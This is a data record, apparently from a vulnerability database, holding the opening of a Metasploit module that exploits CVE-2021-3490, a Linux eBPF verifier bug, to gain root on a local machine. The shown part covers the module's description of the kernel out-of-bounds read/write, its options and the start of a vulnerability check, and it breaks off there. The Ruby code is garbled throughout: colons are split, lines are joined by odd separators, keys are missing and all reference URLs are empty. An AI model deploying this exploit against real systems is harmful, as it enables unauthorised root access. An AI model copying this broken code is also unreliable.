{
    "text": "vul_name : Linux eBPF ALU32 32-bit Invalid Bounds Tracking Local Privilege Escalation ， vul_cve : CVE-2021-3490 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GreatRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : Linux : Kernel ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super (  ， update_info (  ， info ,  ， 'Name' => 'Linux eBPF ALU32 32-bit Invalid Bounds Tracking LPE' ,  ， 'Description' => %q{ ， Linux kernels from 5.7-rc1 prior to 5.13-rc4 , 5.12.4 , 5.11.21 , and ， 5.10.37 are vulnerable to a bug in the eBPF verifier's verification ， of ALU32 operations in the scalar32_min_max_and function when performing ， AND operations , whereby under certain conditions the bounds of a ， 32 bit register would not be properly updated. ， This can be abused by attackers to conduct an out of bounds read ， and write in the Linux kernel and therefore achieve arbitrary ， code execution as the root user. ， The target system must be compiled with eBPF support and not have ， kernel.unprivileged_bpf_disabled set , which prevents unprivileged ， users from loading eBPF programs into the kernel. Note that if ， kernel.unprivileged_bpf_disabled is enabled this module can still be ， utilized to bypass protections such as SELinux , however the user ， must already be logged as a privileged user such as root. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Manfred Paul' ,  # Aka @ _manfp , original vulnerability discovery ， 'chompie1337' ,  # Exploit writeup and PoC ， 'Grant Willcox' # Aka @ tekwizz123 , Metasploit Module ，  ]  ,  ， 'DisclosureDate' => '2021-05-11' ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'Privileged' => true ,  ， ' ，  [ 'CVE' , '2021-3490' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  # Original PoC ，  [ 'URL' , ' ]  ,  # Discussess the techniques used to gain arbitrary R/W in kernel. ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Notes' => { ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'Stability' => [ CRASH_OS_DOWN ]  ,  ， 'SideEffects' => [  ]  ， } ,  ， 'DefaultTarget' => 0 ， register_options (  [  ， OptInt.new ( 'CmdTimeout' ,  [ true , 'Maximum number of seconds to wait for the exploit to complete' , 120 ]  )  ，  ]  )  ， register_advanced_options (  [  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  )  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， def check ， arch = kernel_hardware ，  # Could we potentially support x86? Yes , potentially. Will we? Well considering the 5.7 kernel was released ，  # in 2020 and official support for x64 kernels ended in 2012 with ，  # combined with the fact that those distros that do have older x86 versions mostly have 4.x or older kernels ,  ，  # and 90% of them have dropped support for x86 kernels a while back , we'll just assume that if its x86 , its probably not ，  # running an affected Linux kernel. ， unless arch.include? ( 'x86_64' ) ",
    "time": "2021.09.01"
}